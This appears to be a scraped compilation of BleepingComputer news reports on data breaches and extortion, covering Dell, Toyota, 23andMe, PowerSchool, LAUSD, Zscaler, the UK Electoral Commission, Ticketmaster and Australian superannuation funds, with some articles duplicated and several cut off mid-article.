swapping attacks . If you receive any SMS texts or phishing emails claiming to be from AT&T, be very careful about providing any information.

Compliance Isn’t Security: Why a Checklist Won’t Stop Cyberattacks,https://www.bleepingcomputer.com/news/security/compliance-isnt-security-why-a-checklist-wont-stop-cyberattacks/,Home,"February 18, 2025","By Autumn Stambaugh, Senior Sales Engineer at Pentera Think you're safe because you're compliant? Think again. Recent studies continue to highlight the concerning trend that compliance with major security frameworks does not necessarily prevent data breaches. For instance, in 2024, the average cost of a data breach reached an all-time high of $4.88 million, a 10% increase from the previous year. The latest high-profile breaches at MGM Resorts , AT&T , and Ticketmaster prove that compliance alone won’t stop attackers. All of these organizations adhered to compliance frameworks, yet compliance alone didn’t stop these attacks. Instead, adversaries exploited vulnerabilities that hadn’t been properly patched, misconfigurations that went undetected, and weak security controls. These organizations still suffered massive cyberattacks, resulting in data exposure, financial losses, and operational disruptions. The harsh reality? Attackers get through the gaps of your compliance checklist. Compliance frameworks like PCI-DSS, SEC, and DORA are designed to protect sensitive data and reduce risk, providing clear guidance on managing confidentiality, integrity, and availability. But these frameworks are just that—guidance. They don’t address the dynamic nature of today’s threats, nor do they assess the effectiveness of the controls organizations implement. For many companies, compliance is treated as the finish line rather than a baseline for security. Organizations focus on passing audits, deploying firewalls, and implementing detection & response tools to satisfy regulatory mandates. But compliance alone doesn’t measure whether these controls can withstand real-world threats. Without continuous validation, security teams remain blind to gaps that attackers can exploit. Instead of relying on compliance as a security strategy, organizations must adopt a proactive approach that validates security controls against real-world attack methods. Here’s how: Simulated attacks expose security gaps that compliance frameworks can’t detect. Regular penetration testing, red teaming, and automated continuous validation allow organizations to measure how well their defenses perform against adversarial tactics. Security controls should be tested under realistic conditions—not just during compliance audits. Compromised credentials remain one of the top attack vectors. Organizations must actively monitor for exposed credentials across dark web forums and paste sites, ensuring they can revoke access before attackers can exploit it. Enforcing strong password policies and multi-factor authentication (MFA) further reduces this risk. Cyber threats evolve rapidly, and new vulnerabilities emerge daily. For example, the MOVEit Transfer zero-day vulnerability discovered in 2023 led to widespread data breaches, affecting hundreds of organizations. This highlights how attackers constantly exploit new weaknesses before security teams have a chance to respond. Organizations should prioritize ongoing security testing, including: While compliance frameworks establish a strong foundation, they should never be treated as the finish line. Organizations must go beyond regulatory requirements by incorporating proactive security measures, such as: Attackers don’t care about compliance—they care about finding vulnerabilities. Companies that rely solely on regulatory checklists will continue to suffer breaches, even when fully certified. The key to security is not just meeting compliance requirements but actively testing, validating, and improving defenses against real-world attacks. To stay ahead of attackers, organizations must treat compliance as a foundation, not a security strategy. Investing in continuous security validation, proactive testing, and adversary emulation ensures that security measures work when it matters most. Don’t just check the box—test your security. Invest in automated security validation , schedule regular penetration tests, and continuously challenge your defenses to ensure they can withstand real-world attacks.

While the healthcare service provider did not provide further details about the September attack, the RansomHub ransomware gang claimed the breach in October, saying it stole 1.5TB of files from Baymark's compromised systems. The data has since been uploaded on the threat actors' dark web leak site. ​The RansomHub ransomware-as-a-service (RaaS) operation (formerly known as Cyclops and Knight) surfaced almost one year ago, in February 2024, and is focused on data-theft-based extortion rather than encrypting victims' systems.

RansomHub also leaked Change Healthcare's stolen data after the BlackCat/ALPHV ransomware operation shut down after stealing $22 million in an exit scam. Since it surfaced, the FBI says RansomHub ransomware affiliates have breached over 200 victims from a wide range of critical U.S. infrastructure sectors, including government, critical infrastructure, and healthcare, until August 2024.

""We do not believe this is a new incident, as samples of data match the data previously stolen in December. We have reported this matter to law enforcement both in the United States and in Canada and are working closely with our customers to support them.

PowerSchool apologized for the ongoing threats caused by the breach and says they will continue to work with customers and law enforcement to respond to the extortion attempts. The company also recommends that students and faculty take advantage of the free two years of credit monitoring and identity protection to protect against fraud and identity theft. More details about this can be found in the company's security incident FAQ . PowerSchool also reflected on their choice to pay the ransom demand, stating that it was a difficult decision but hoping it would protect its customers. ""Any organization facing a ransomware or data extortion attack has a very difficult and considered decision to make during a cyber incident of this nature. In the days following our discovery of the December 2024 incident, we made the decision to pay a ransom because we believed it to be in the best interest of our customers and the students and communities we serve,"" continued the PowerSchool statement. ""It was a difficult decision, and one which our leadership team did not make lightly.

Dell API abused to steal 49 million customer records in data breach,https://www.bleepingcomputer.com/news/security/dell-api-abused-to-steal-49-million-customer-records-in-data-breach/#comment_form,Lawrence Abrams,"May 10, 2024","The threat actor behind the recent Dell data breach revealed they scraped information of 49 million customer records using an partner portal API they accessed as a fake company. Yesterday, BleepingComputer reported that Dell had begun to send notifications warning customers that their personal data was stolen in a data breach. This data breach contained customer order data, including warranty information, service tags, customer names, installed locations, customer numbers, and order numbers. A threat actor known as Menelik put the data up for sale on the Breached hacking forum on April 28th, with the moderators soon taking down the post. Menelik told BleepingComputer this morning they were able to steal the data after discovering a portal for partners, resellers, and retailers that could be used to look up order information. Menelik says he could access the portal by registering multiple accounts under fake company names and had access within two days without verification. ""It is very easy to register as a Partner. You just fill an application form,"" Menelik told BleepingComputer. ""You enter company details, reason you want to become a partner, and then they just approve you, and give access to this ""authorized"" portal. I just created my own accounts in this way. Whole process takes 24-48 hours."" Once they gained access to the portal, Menelik told BleepingComputer they had created a program that generated 7-digit service tags and submitted them to the portal page starting in March to scrape the returned information. As the portal reportedly did not include any rate limiting, the threat actor claims they could harvest the information of 49 million customer records by generating 5,000 requests per minute for three weeks, without Dell blocking the attempts. Menelik says the stolen customer records include the following hardware breakdown: The threat actors said they emailed Dell on April 12th and 14th to report the bug to their security team, sharing the email with BleepingComputer. However, the threat actor admittedly harvested 49 million records before contacting the company. The threat actor says Dell never replied to the emails and didn't fix the bug until approximately two weeks later, around the time the stolen data was first put up for sale on the Breach Forums hacking forum. Dell confirmed to BleepingComputer they received the threat actor's emails but declined to answer any further questions, as they say the incident has become an active law enforcement investigation.

Dell API abused to steal 49 million customer records in data breach,https://www.bleepingcomputer.com/news/security/dell-api-abused-to-steal-49-million-customer-records-in-data-breach/,Lawrence Abrams,"May 10, 2024","The threat actor behind the recent Dell data breach revealed they scraped information of 49 million customer records using an partner portal API they accessed as a fake company. Yesterday, BleepingComputer reported that Dell had begun to send notifications warning customers that their personal data was stolen in a data breach. This data breach contained customer order data, including warranty information, service tags, customer names, installed locations, customer numbers, and order numbers. A threat actor known as Menelik put the data up for sale on the Breached hacking forum on April 28th, with the moderators soon taking down the post. Menelik told BleepingComputer this morning they were able to steal the data after discovering a portal for partners, resellers, and retailers that could be used to look up order information. Menelik says he could access the portal by registering multiple accounts under fake company names and had access within two days without verification. ""It is very easy to register as a Partner. You just fill an application form,"" Menelik told BleepingComputer. ""You enter company details, reason you want to become a partner, and then they just approve you, and give access to this ""authorized"" portal. I just created my own accounts in this way. Whole process takes 24-48 hours."" Once they gained access to the portal, Menelik told BleepingComputer they had created a program that generated 7-digit service tags and submitted them to the portal page starting in March to scrape the returned information. As the portal reportedly did not include any rate limiting, the threat actor claims they could harvest the information of 49 million customer records by generating 5,000 requests per minute for three weeks, without Dell blocking the attempts. Menelik says the stolen customer records include the following hardware breakdown: The threat actors said they emailed Dell on April 12th and 14th to report the bug to their security team, sharing the email with BleepingComputer. However, the threat actor admittedly harvested 49 million records before contacting the company. The threat actor says Dell never replied to the emails and didn't fix the bug until approximately two weeks later, around the time the stolen data was first put up for sale on the Breach Forums hacking forum. Dell confirmed to BleepingComputer they received the threat actor's emails but declined to answer any further questions, as they say the incident has become an active law enforcement investigation. However, the company claims they had already detected the activity before receiving the threat actor's email. ""Let's keep in mind, this threat actor is a criminal and we have notified law enforcement,"" Dell told BleepingComputer. ""We are not disclosing any information that could compromise the integrity of our ongoing investigation or any investigations by law enforcement.""

The data protection watchdog said today that 23andMe failed to protect the sensitive data of UK residents who had their genotype data, health reports, and personal information stolen in credential stuffing attacks using stolen login credentials that went unnoticed for five months between April 2023 and September 2023. ""This was a profoundly damaging breach that exposed sensitive personal information, family histories, and even health conditions of thousands of people in the UK,"" said John Edwards, UK's Information Commissioner. ""As one of those impacted told us: once this information is out there, it cannot be changed or reissued like a password or credit card number."" As the genomics company disclosed in data breach notification letters sent to impacted individuals, some of this extremely sensitive stolen data was released on the unofficial 23andMe subreddit site and the BreachForums hacking forum. The leaked information included the data of 4.1 million people living in the United Kingdom and Germany, as well as that of 1 million Ashkenazi Jews . After discovering this extensive breach, 23andMe implemented measures to block similar incidents, including enabling two-factor authentication by default and requiring customers to reset passwords . ""As part of our regulatory process, we took into consideration representations from 23andMe, before deciding on whether to impose a financial penalty, and the final amount of the penalty,"" an ICO spokesperson told BleepingComputer when asked how the fine amount was calculated. ""The amount of this fine has been set in accordance with our Data Protection Fining Guidance | ICO . This specific section of the fining guidance details the maximum amount we may fine a company."" This fine comes after the California-based genetic testing provider filed for Chapter 11 bankruptcy in late March and announced that it plans to sell its assets following multiple years of financial struggles. The 2023 data breach has led to multiple class-action lawsuits , which prompted 23andMe to amend its Terms of Use in November 2023 to make it harder to get sued. However, the company claimed the changes only aimed to simplify the arbitration process.

Trygg-Hansa is an insurer for individuals, private companies, and public organizations, and also an asset management and investment consultation firm. IMY initiated an investigation on the firm after receiving a tip from a Moderna Försäkringar (now part of Trygg-Hansa) customer, who had discovered it was possible to access the insurer’s backend by following links available on quotation pages sent to clients. These are sent to all existing or potential customers via SMS or email, containing a unique web address (URL) to a quote page on Trygg-Hansa’s website.

About 650,000 customers have been impacted. The information exposed included: To make matters worse, IMY determined that the data was exposed through Trygg-Hansa’s portal to unauthorized parties for more than two years, between October 2018 and February 2021. Such an extensive exposure period increases the likelihood of someone finding the flaw and exploiting it to collect sensitive information.

The insurer’s failure to remedy the issues all this time, even after it received reports about the flaw, according to IMY, indicates a severe shortfall in data security and risk mitigation measures for which the regulator decided to impose an administrative penalty of $3M.

Toyota Financial Services, a subsidiary of Toyota Motor Corporation, is a global entity with a presence in 90% of the markets where Toyota sells its cars, providing auto financing to its customers. Last month, the company confirmed that it detected unauthorized access on some of its systems in Europe and Africa, following a claim from Medusa ransomware about successfully compromising the Japanese automaker's division. The threat actors demanded a payment of $8,000,000 to delete the stolen data and gave Toyota 10 days to respond to their blackmail. At the time, a Toyota spokesperson told BleepingComputer that the company had detected unauthorized access on some of its systems in Europe and Africa. The company took certain systems offline to contain the breach, which impacted customer services. Presumably, Toyota has not negotiated a ransom payment with the cybercriminals, and currently, all data has been leaked on Medusa's extortion portal on the dark web. Earlier this month, Toyota Kreditbank GmbH in Germany was identified as one of the impacted divisions, admitting that hackers gained access to customers' personal data.

At the time, a Toyota spokesperson told BleepingComputer that the company had detected unauthorized access on some of its systems in Europe and Africa. The company took certain systems offline to contain the breach, which impacted customer services. Presumably, Toyota has not negotiated a ransom payment with the cybercriminals, and currently, all data has been leaked on Medusa's extortion portal on the dark web. Earlier this month, Toyota Kreditbank GmbH in Germany was identified as one of the impacted divisions, admitting that hackers gained access to customers' personal data. German news outlet Heise received a sample of the notices sent by Toyota to German customers, informing that the following data has been compromised: This type of data can be used in phishing, social engineering, scams, financial fraud, and even identity theft attempts. The notification verifies the above data as compromised based on the ongoing investigation. However, the internal investigation isn't complete yet, and there remains a possibility that attackers accessed additional information. Toyota promises to promptly update affected customers should the internal investigation reveal further data exposure. BleepingComputer has contacted Toyota for additional information, like the exact number of exposed customers, but we have not heard back by publication time.

How to Mitigate the Impact of Third-Party Breaches,https://www.bleepingcomputer.com/news/security/how-to-mitigate-the-impact-of-third-party-breaches/,Home,"May 7, 2024","Modern organizations are deeply interconnected, with a complex web of relationships and dependencies. The flow of data is a critical aspect of this interconnectedness, as organizations rely on data to drive decision-making, collaborate with partners, engage with customers, and optimize operations. It’s estimated that the global volume of data created, consumed, and stored in 2024 will reach 147 zettabytes – a figure so big that it’s hard to conceptualize. Despite the obvious advantages of sharing data, this means organizations are connected in terms of risk too. The interconnected nature of organizations and flow of data creates a dynamic ecosystem where disruptions or breaches in one part of the network can have ripple effects throughout the entire system. Even if your own house is in order, a breach elsewhere can still impact the security, privacy, and integrity of your data. So, what can you do about another organization, perhaps on the other side of the world, suffering a data breach? The impact of third-party breaches shouldn’t be underestimated but there are practical ways to greatly reduce your risk. In a third-party breach scenario, the initial breach occurs not within your organization's own network, but within the network or system of a third-party entity that your organization has a business relationship with. A hacker then uses this initial breach as a platform to gain further unauthorized access to the sensitive data or systems of other organizations in their supply chain. For example, let’s say a financial institution partners with a software provider to handle their customer data. A third-party breach could occur if the software provider's network was compromised by hackers, exposing the customer data of the financial institution. This is just one example and there are several ways a supply chain breach could occur. Impacts of a third-party breach can include: SolarWinds is a software company that provides IT management and monitoring solutions. In probably the most infamous recent example of a third-party breach , hackers gained unauthorized access to SolarWinds’ systems, with major knock-on effects. The hackers inserted malicious code into SolarWinds' software updates, which were then distributed to SolarWinds' customers, including numerous government agencies and organizations worldwide. As a result, the hackers were able to infiltrate the networks of many of these customers, compromising their systems and gaining access to sensitive data. The SolarWinds hack highlighted the risks associated with third-party vendors and the potential for supply chain attacks, where attackers target a trusted vendor to gain access to multiple organizations across its global supply chain. Passwords play a significant role in third-party breaches. One serious and often overlooked issue is passwords reuse . Many individuals reuse passwords across multiple accounts, including their personal and professional accounts. If a third-party vendor experiences a data breach and user credentials (including passwords) are compromised, hackers can use those credentials to gain unauthorized access to other accounts where the same password is used. This significantly increases the impact of a third-party breach. Hackers often use automated tools to test compromised credentials from one breach against multiple online services. This technique, known as credential stuffing, relies on the fact that many people reuse passwords across different accounts. If a user's credentials from a breached third-party vendor are successfully used to gain access to other accounts, it can lead to unauthorized access, data theft, and potential financial loss. A tool such as Specops Password Policy allows you to continuously monitor your Active Directory for passwords that have been compromised elsewhere. Our database includes over 4 billion unique passwords from real-time attack monitoring systems that monitor live brute force attacks, plus malware-stolen data from our human-led Threat Intelligence team. External Attack Surface Management (EASM) can play a crucial role in helping organizations prevent and mitigate the impact of third-party breaches. EASM solutions can scan and identify all internet-facing assets connected to an organization, including those associated with third-party vendors. If the third-party vendors are hosting services (like an EASM customer's domain and the website on it) then scanning it would be the same as if the domain was 100% owned by the EASM customer. Having this visibility allows organizations to understand the true extent of their attack surface and identify potential vulnerabilities or weak points introduced by third-party vendors.

The Japanese tech giant states that the attack did not involve ransomware but relied on a sophisticated mechanism to evade detection while exfiltrating data. In March, the company discovered that several of its systems had been infected with malware and noted the possibility of sensitive customer information being compromised. Fujitsu isolated the impacted computers and started an investigation with the help of external experts to determine the scope of the breach. In a statement today, the company says that it has concluded the investigation into the incident and confirms that data was stolen by malware that pivoted from a single point of compromise to 49 computers.

TracFone is a telecommunications service provider offering services through Total by Verizon Wireless, Straight Talk, and Walmart Family Mobile, among others. Apart from the hefty civil penalty, the announced settlement agreement requires the communications firm to implement specific measures to increase the level of data security for its customers going forward. Data breaches at TracFone occurred between 2021 and 2023, involving three separate incidents. The first, referred to as the 'Cross-Brand' incident, was self-reported by TracFone on January 14, 2022. The company discovered it in December 2021, but the investigation showed that the threat actors had access to customer data since January 2021. With access to sensitive information, including personally identifiable information (PII) and customer proprietary network information (CPNI), the threat actors conducted a high number of unauthorized number porting request approvals. ""In connection with this incident, threat actors exploited certain vulnerabilities related to authentication and a limited number of APIs,"" reads the decree. ""By exploiting those vulnerabilities, threat actors were able to gain unauthorized access to certain customer information."" The other two data breach incidents concern TracFone's order websites, reported on December 20, 2022, and January 13, 2023, respectively. In both cases, unauthenticated threat actors exploited a vulnerability to access order information, including certain CPNI and other customer data.

LAUSD is the second largest public school district in the United States, with over 25,900 teachers, roughly 48,700 other employees, and more than 563,000 students enrolled during the 2023-2024 school year . The threat actor selling the allegedly stolen data for $1,000 says the CSV files put up for sale on a hacking forum contain over 11GB of data, as first spotted by Dark Web Informer . These files are said to include over 26 million records with student information, more than 24,000 teacher records, and around 500 containing staff information. They also shared two data samples containing roughly 1,000 student records with Social Security Numbers (SSNs), addresses, parent addresses, email addresses, contact information, and dates of birth as proof that the information was legitimate. Researchers who analyzed these samples told BleepingComputer that the sold data appears legitimate but could be old, as the dataset does not include recent dates. However, the threat actor only shared a small sample of the allegedly stolen data, so there may be new information that has yet to be shared. BleepingComputer contacted LAUSD earlier today to confirm the threat actor's claims and was told that the public school district is investigating. After the article was published, the school district sent a follow-up statement saying that law enforcement had also been informed and is now helping with the investigation. ""Los Angeles Unified has become aware of an account from a malicious actor purporting to offer certain district data for sale,"" an LAUSD spokesperson told BleepingComputer. ""The District is investigating the claim and engaging with law enforcement to investigate and respond to the incident. As always, we prioritize the privacy of our students, families and employees."" LAUSD was also hit by a ransomware attack in September 2022, over the Labor Day weekend. The Vice Society gang claimed the breach, saying they also stole 500GB of files before encrypting the district's systems. On the day LAUSD disclosed the incident, the FBI, CISA, and MS-ISAC also issued a joint advisory warning that Vice Society was disproportionately targeting education organizations . After the attack, LAUSD asked all employees (including teachers, support staff, and administrators) and students to reset their @LAUSD.net account credentials in person at a district site and expedited the rollout of multi-factor authentication. Almost one month after the attack, Vice Society published the stolen LAUSD data on their dark web leak site, including what a law enforcement source described as ""confidential psychological assessments of students, contract and legal documents, business records, and numerous database entries."" The leak came after the district announced that it would not pay the ransom demanded by the ransomware gang because it wouldn't guarantee the full recovery of data and ""public dollars are better spent on our students.""

Toyota confirms third-party data breach impacting customers,https://www.bleepingcomputer.com/news/security/toyota-confirms-third-party-data-breach-impacting-customers/#comments,Sergiu Gatlan,"August 19, 2024","Toyota confirmed that customer data was exposed in a third-party data breach after a threat actor leaked an archive of 240GB of stolen data on a hacking forum. ""We are aware of the situation. The issue is limited in scope and is not a system wide issue,"" Toyota told BleepingComputer when asked to validate the threat actor's claims. The company added that it's ""engaged with those who are impacted and will provide assistance if needed,"" but has yet to provide information on when it discovered the breach, how the attacker gained access, and how many people had their data exposed in the incident. One day later, a spokesperson clarified in a new statement shared with BleepingComputer that Toyota Motor North America's systems were ""not breached or compromised,"" and the data was stolen from what appears to be ""a third-party entity that is misrepresented as Toyota."" When asked to share the name of the breached third-party entity, the spokesperson said that Toyota Motor North America was ""not at liberty to disclose"" that information. ZeroSevenGroup (the threat actor who leaked the stolen data) says they breached a U.S. branch and were able to steal 240GB of files with information on Toyota employees and customers, as well as contracts and financial information, They also claim to have collected network infrastructure information, including credentials, using the open-source ADRecon tool that helps extract vast amounts of information from Active Directory environments. ""We have hacked a branch in United States to one of the biggest automotive manufacturer in the world (TOYOTA). We are really glad to share the files with you here for free. The data size: 240 GB,"" the threat actor claims. ""Contents: Everything like Contacts, Finance, Customers, Schemes, Employees, Photos, DBs, Network infrastructure, Emails, and a lot of perfect data. We also offer you AD-Recon for all the target network with passwords."" While Toyota hasn't shared the date of the breach, BleepingComputer found that the files had been stolen or at least created on December 25, 2022.

Toyota confirms third-party data breach impacting customers,https://www.bleepingcomputer.com/news/security/toyota-confirms-third-party-data-breach-impacting-customers/,Sergiu Gatlan,"August 19, 2024","Toyota confirmed that customer data was exposed in a third-party data breach after a threat actor leaked an archive of 240GB of stolen data on a hacking forum. ""We are aware of the situation. The issue is limited in scope and is not a system wide issue,"" Toyota told BleepingComputer when asked to validate the threat actor's claims. The company added that it's ""engaged with those who are impacted and will provide assistance if needed,"" but has yet to provide information on when it discovered the breach, how the attacker gained access, and how many people had their data exposed in the incident. One day later, a spokesperson clarified in a new statement shared with BleepingComputer that Toyota Motor North America's systems were ""not breached or compromised,"" and the data was stolen from what appears to be ""a third-party entity that is misrepresented as Toyota."" When asked to share the name of the breached third-party entity, the spokesperson said that Toyota Motor North America was ""not at liberty to disclose"" that information. ZeroSevenGroup (the threat actor who leaked the stolen data) says they breached a U.S. branch and were able to steal 240GB of files with information on Toyota employees and customers, as well as contracts and financial information, They also claim to have collected network infrastructure information, including credentials, using the open-source ADRecon tool that helps extract vast amounts of information from Active Directory environments. ""We have hacked a branch in United States to one of the biggest automotive manufacturer in the world (TOYOTA). We are really glad to share the files with you here for free. The data size: 240 GB,"" the threat actor claims. ""Contents: Everything like Contacts, Finance, Customers, Schemes, Employees, Photos, DBs, Network infrastructure, Emails, and a lot of perfect data. We also offer you AD-Recon for all the target network with passwords."" While Toyota hasn't shared the date of the breach, BleepingComputer found that the files had been stolen or at least created on December 25, 2022.

This warning follows the compromise of Salesloft Drift , an AI chat agent that integrates with Salesforce, in which attackers stole OAuth and refresh tokens, enabling them to gain access to customer Salesforce environments and exfiltrate sensitive data. In an advisory, Zscaler says that its Salesforce instance was impacted by this supply-chain attack, exposing customers' information. ""As part of this campaign, unauthorized actors gained access to Salesloft Drift credentials of its customers including Zscaler,"" reads Zscaler's advisory . ""Following a detailed review as part of our ongoing investigation, we have determined that these credentials have allowed limited access to some Zscaler's Salesforce information."" After publishing this story, Zscaler told BleepingComputer that data exfiltration occurred between August 13 to 16th, with the data accessed a few other times prior to then. The exposed information includes the following: The breach impacts a large number of customers but Zscaler is not sharing the total number. The company stresses that the data breach only impacts its Salesforce instance and no Zscaler products, services, or infrastructure. While Zscaler states that it has detected no misuse of this information, it recommends that customers remain vigilant against potential phishing and social engineering attacks that could exploit this information. The company also says it has revoked all Salesloft Drift integrations to its Salesforce instance, rotated other API tokens, and is conducting an investigation into the incident. Zscaler has also strengthened its customer authentication protocol when responding to customer support calls to guard against social engineering attacks. Google Threat Intelligence warned last week that a threat actor, tracked as UNC6395, is behind the attacks, stealing support cases to harvest authentication tokens, passwords, and secrets shared by customers when requesting support. ""GTIG observed UNC6395 targeting sensitive credentials such as Amazon Web Services (AWS) access keys (AKIA), passwords, and Snowflake-related access tokens,"" reports Google . ""UNC6395 demonstrated operational security awareness by deleting query jobs, however logs were not impacted and organizations should still review relevant logs for evidence of data exposure."" It was later revealed that the Salesloft supply-chain attack not only impacted Drift Salesforce integration, but also Drift Email, which is used to manage email replies and organize CRM and marketing automation databases. Google warned last week that attackers also used stolen OAuth tokens to access Google Workspace email accounts and read emails as part of this breach. Google and Salesforce have temporarily disabled their Drift integrations pending the completion of an investigation. Some researchers have told BleepingComputer that they believe the Salesloft Drift compromise overlaps with the recent Salesforce data theft attacks by the ShinyHunters extortion group. Since the beginning of the year, the threat actors have been conducting social engineering attacks to breach Salesforce instances and download data. During these attacks, threat actors conduct voice phishing (vishing) to trick employees into linking a malicious OAuth app with their company's Salesforce instances. Once linked, the threat actors used the connection to download and steal the databases, which were then used to extort the company through email.

USG is a state government agency that operates 26 public colleges and universities in Georgia with over 340,000 students. The Clop ransomware gang leveraged a zero-day vulnerability in Progress Software MOVEit Secure File Transfer solution in late May 2023 to conduct a massive worldwide data theft campaign. When the threat group started its extortion phase in the MOVEit attacks that impacted thousands of organizations worldwide, USG was among the first to be listed as compromised. Almost a year later, with the help of the FBI and CISA, USG determined that Clop had stolen sensitive files from its systems and began notifying impacted people. The notices of data breach were sent between April 15 and April 17, 2024, informing recipients that the cybercriminals accessed the following information: Given that the number of impacted individuals is larger than the number of students under USG, and considering the type of information, the incident presumably also affects prior students, academic staff, contractors, and other personnel. The organization submitted a sample of the data breach notice to the Office of the Maine Attorney General yesterday, stating that the data breach impacts 800,000 people . Also, the entry on Maine's portal lists a driver's license number or identification card number as exposed data types, although these aren't mentioned in the notice. USG now offers impacted individuals 12 months of identity protection and fraud detection services through Experian, in which the recipients are given until July 31, 2024, to enroll. Clop's MOVEit attacks were one of the most successful and prolific extortion operations in recent history. Over a year after they took place, organizations still discover, confirm, and disclose breaches, extending the aftermath. Emsisoft's dedicated counter of MOVEit victims lists 2,771 impacted organizations and nearly 95 million individuals whose personal data lies in Clop's servers. Some of that data was published on Clop's extortion portal on the dark web, others were sold to cybercrime groups, and some remain to be monetized in the future.

Shadow (Shadow) is a cloud gaming service providing users with high-end Windows PCs streamed to their local devices (PCs, laptops, smartphones, tablets, smart TVs), allowing them to run demanding AAA games on a virtual computer. According to multiple tips sent to BleepingComputer yesterday from Shadow customers, the company has begun sending data breach notifications following a successful social engineering attack targeting its employees. ""At the end of September, we were the victim of a social engineering attack targeting one of our employees,"" reads the notice. ""This highly sophisticated attack began on the Discord platform with the downloading of malware under cover of a game on the Steam platform, proposed by an acquaintance of our employee, himself a victim of the same attack."" Based on the description of the attack, the downloaded malware was an info-stealer that successfully stole an authentication cookie that allowed the hackers to log in to the management interface of one of the company's SaaS (software-as-a-service) providers. Leveraging this access, the attacker abused the API to extract customers' full names, email addresses, dates of birth, billing addresses, and credit card expiration dates. Shadow's notice clarifies that the incident has not resulted in the exposure of account passwords or other sensitive payment/banking data. Shadow says that it has revoked the stolen authentication cookie and that the hacker's access to its systems has been blocked. Moreover, Shadow has implemented additional defenses to prevent similar incidents from occurring in the future. The firm assures the impacted customers that the compromised service provider did not hold any other user data beyond what is highlighted in the notice. However, impacted individuals are urged to remain vigilant for phishing and scamming attempts and activate multi-factor authentication (MFA) on all their accounts. Limited additional information on the incident can be found on this Reddit discussion joined by an employee of the firm. However, no official statements on the incident have been posted on the official website or social media channels. BleepingComputer contacted Shadow with questions regarding the incident, and we will update this post with their statement. Last night, a threat actor claimed to be responsible for the attack and is selling the stolen database on a well-known hacking forum. The threat actor claims that they breached Shadow at the end of September and were able to steal the data for 533,624 users. ""At the end of September, I gained access to the database of the French company Shadow. It contains only customers, not all Shadow users,"" reads the for sale post. ""After an attempt at amicable settlement, which they deliberately ignored, I decided to put the database up for sale."" The threat actor also says IP connection logs were stolen in the breach in addition to the other data already confirmed by Shadow.

Hackers have leaked what they claim is Ticketmaster barcode data for 166,000 Taylor Swift Eras Tour tickets, warning that more events would be leaked if a $2 million extortion demand is not paid. In May, a well-known threat actor named ShinyHunters began selling data on 560 million Ticketmaster customers for $500,000. Ticketmaster later confirmed the data breach, which they ultimately stated was from their account on Snowflake, a cloud-based data warehousing company used by the enterprise to store databases, process data, and perform analytics. In April, threat actors began downloading Snowflake databases of at least 165 organizations using credentials stolen by information-stealing malware. The threat actors then blackmailed the companies, demanding payment to prevent the data from being leaked or sold to other threat actors. Companies confirmed to have had data stolen from their Snowflake accounts include Neiman Marcus , Los Angeles Unified School District , Advance Auto Parts , Pure Storage , and Satander . Today, a threat actor known as Sp1d3rHunters has leaked what they claim is the ticket data for 166,000 Taylor Swift Eras Tour barcodes used to gain entry on various concert dates. Sp1d3rHunters, previously named Sp1d3r, is the threat actor behind the sale of data stolen from Snowflake accounts, publicly extorting the various companies for payments.

The post claims the barcode data is for upcoming Taylor Swift concerts in Miami, New Orleans, and Indianapolis. The post includes a small sample of the alleged barcode data, which contains the value used to create a scannable barcode, seat information, the face value of tickets, and other information. The threat actor further shared details on how to turn this data into a scannable barcode. While the barcode data was not part of the initial leak of stolen Ticketmaster data samples released by the threat actors in May, some of the newly leaked data can be found in the older leaks, including the hashed credit card and sales order information for the tickets. The group behind these attacks is ShinyHunters, which has been responsible for many data breaches over the years. These include leaking the data for 386 million user records from 18 companies in 2020, an AT&T breach impacting 70 million customers , and, most recently, the leaking of 33 million phone numbers used with the Authy multi-factor authentication app. Update 7/5/24 3:44 PM ET: Ticketmaster told BleepingComputer that unique barcodes are updated every few seconds, so the stolen tickets cannot be used.

In March, the U.K. National Cyber Security Centre (NCSC) attributed the UK Electoral Commission breach to a Chinese state-backed threat actor. Tracked as CVE-2021-34473, CVE-2021-34523, and CVE-2021-31207, these security flaws were chained to hack into the commission's Exchange Server 2016 and deploy web shells, which allowed the attackers to gain persistence after installing web shells and backdoors. While Microsoft released security updates in May 2021 that fixed the ProxyShell vulnerability chain, the commission failed to patch its systems promptly, exposing them to attacks. The attack and the deployed malware were discovered on October 28, 2021 , when an employee found that the Commission's Exchange server was being used to send spam emails. During the breach, the Chinese hackers gained access to the personal information of around 40 million people, including their names, home addresses, email addresses, and phone numbers. While the commission downplayed the impact, saying ""much of it is already in the public domain,"" only voters' names and addresses are publicly available in the U.K. open register. ""Our investigation found that the Electoral Commission did not have appropriate security measures in place to protect the personal information it held,"" the ICO said . ""The Electoral Commission also did not have sufficient password policies in place at the time of the attack, with many accounts still using passwords identical or similar to the ones originally allocated by the service desk."" Today, the ICO reprimanded the U.K. elections authority for failing to protect its systems and the personal information of millions of voters. The ICO Deputy Commissioner Stephen Bonner said that if the commission ""had taken basic steps to protect its systems, such as effective security patching and password management, it is highly likely that this data breach would not have happened."" However, Bonner added that the ICO has no reason to believe any personal information was misused since it was accessed in 2021 and has yet to find evidence that the breach has caused direct harm to impacted voters. In August 2021, days after the U.K. Electoral Commission breach was disclosed, Shodan revealed that it was tracking tens of thousands of Exchange servers vulnerable to ProxyShell attacks. The breach came after the U.K., the U.S., and its allies blamed China's Ministry of State Security (MSS) for widespread attacks that hit tens of thousands of organizations worldwide in March 2021.

The Association of Superannuation Funds of Australia (ASFA), Australia's advocacy body for the superannuation industry, said today that ""a number of members were affected"" even though the ""majority of the attempts were repelled."" Reuters has learned from a source familiar with the matter that over 20,000 accounts were breached in this massive wave of attacks targeting Australia's superannuation industry, with some members reportedly losing some of their savings. Since the weekend attacks, some of the country's largest profit-to-member superannuation funds with millions of members each and managing tens or hundreds of billions—including AustralianSuper, Hostplus, REST and Australian Retirement Trust, and Insignia Financial—confirmed that some of their members' accounts were breached in these attacks. AustralianSuper, which manages the retirement savings of over 3.5 million members from over 472,000 businesses, totaling over $365 billion, confirmed that the attackers breached at least 600 accounts using stolen credentials. ""Over the past week, we have seen a spike in suspicious activity across our member portal and mobile app and we are urging members to take steps to protect themselves online,"" said AustralianSuper Chief Member Officer Rose Kerlin . ""This week we identified that cyber criminals may have used up to 600 members' stolen passwords to log into their accounts in attempts to commit fraud. While we took immediate action to lock these accounts and let those members know, there are things members can do right now to protect themselves online."" Rest revealed that its online MemberAccess portal was also targeted over the weekend of 29-30 March. Although it shut down the portal in reaction to the attacks, approximately 8,000 members had some limited personal information (including first name, email address, and member identification number) accessed. However, Rest says there is no evidence that the attackers transferred funds from compromised members' accounts. Hostplus also noted that its members have lost no funds due to these attacks and that the extent of the impact on their accounts is being investigated. While ASFA and the other affected super funds didn't share additional details on the account breaches, 